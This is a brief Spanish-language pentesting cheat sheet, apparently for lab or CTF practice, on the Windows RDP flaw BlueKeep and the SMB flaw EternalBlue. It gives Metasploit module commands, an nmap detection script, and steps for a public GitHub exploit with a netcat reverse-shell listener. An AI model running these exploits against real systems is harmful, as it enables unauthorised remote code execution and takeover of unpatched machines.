### BlueKeep
Vulnerabilidad que afecta a sistemas windows con RDP que permite aconotecer un RCE **(CVE-2019-0708)** Ya que accede a una parte de la memoria del kernel y nos permite ejecutar código.

Afecta a:
* XP
* Vista
* Windows 7
* Windows server 2008 y 2008R2

#### Explotar BlueKeep con metasploit
```bash
search bluekeep
usar

Si da error, es por que hay que elegir el target (S.O) de manera manual,. para ello:
show targets (y elegir el correspondiente)
```

### Eternalblue
Vulnerabilidad que afecta a sistemas operativos windows relativamente antiguos, (Windows 7, Windows server 2008), que nos permite ejecución remota de comandos. el CVE: **CVE-2017-0143** y **MS17-010** 

Al detectar esto con nmap, se puede llegar a explotar de diferentes maneras:
```bash
nmap 10.10.10.4 --script "smb-vuln-ms17-010" -p 445
```

#### Método 1 (Metasploit)
```bash
# Hay varios, si este no funciona, buscar en metasploit una alternativa
use exploit/windows/smb/ms17_010_eternalblue
```

#### Método 2 (Exploit github)
[Link a github](https://github.com/3ndG4me/AutoBlue-MS17-010)

```bash
# Primero preparar el ataque
./shell_prep.sh

# Esto genera ficheros sc_x64.bin o sc_x86.bin depende el S.O
# Nos ponemos a la escucha con nc
nc -nlvp <puerto>

# Ejecutar exploit
python eternalblue_exploit7.py <ip> sc_x64.bin

Para windows 10 (eternalblue_exploit10.py)
```